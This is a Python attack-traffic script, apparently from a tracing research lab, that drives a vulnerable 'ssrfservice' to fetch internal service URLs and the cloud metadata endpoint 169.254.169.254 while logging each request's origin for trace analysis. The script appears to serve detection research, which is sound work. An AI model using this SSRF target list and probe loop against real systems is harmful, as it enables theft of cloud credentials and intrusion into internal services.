"""SSRF probing: asks ssrfservice to fetch internal and cloud-metadata URLs.

ssrfservice continues the client's trace, so its server-side request (the SSRF
edge ssrfservice -> target) appears under the same trace ID as the probe.
"""

import os
import sys
import time
import argparse

import requests

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from provenance import Pacer, add_origin_args, origin_log_from_args, send  # noqa: E402

# attack surface for SSRF
SSRF_TARGETS = [
    "http://frontend:80/",
    "http://authservice:8080/healthz",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/",
    "http://productcatalogservice:3550/",
]


def main():
    p = argparse.ArgumentParser(description="ShadowTrace SSRF probing attack")
    p.add_argument("--duration", type=int, required=True)
    p.add_argument("--url", default="http://localhost:8082/fetch",
                   help="ssrfservice /fetch endpoint (port-forwarded)")
    p.add_argument("--label", default="ssrf_probe", help="origin label in origin.jsonl")
    p.add_argument("--pause", type=float, default=0.1)
    add_origin_args(p)
    args = p.parse_args()
    log = origin_log_from_args(args, client="ssrf_probe")
    pacer = Pacer(args.pause, args.jitter, args.rng_seed)

    s = requests.Session()
    start, sent, hits, i = time.time(), 0, 0, 0
    print(f"[ssrf] driving {args.url} with {len(SSRF_TARGETS)} internal targets for {args.duration}s")
    while time.time() - start < args.duration:
        target = SSRF_TARGETS[i % len(SSRF_TARGETS)]
        i += 1
        try:
            # ask ssrfservice to fetch the target for us - that server-side request
            # is what creates the tell-tale ssrfservice->target edge in the trace
            r = send(s, "GET", args.url, log, args.label, params={"url": target}, timeout=6)
            sent += 1
            hits += r.status_code == 200
        except requests.RequestException:
            pass
        pacer.sleep()
    log.close()
    print(f"[ssrf] done: {sent} SSRF requests in {time.time()-start:.0f}s ({hits} fetched ok)")


if __name__ == "__main__":
    main()
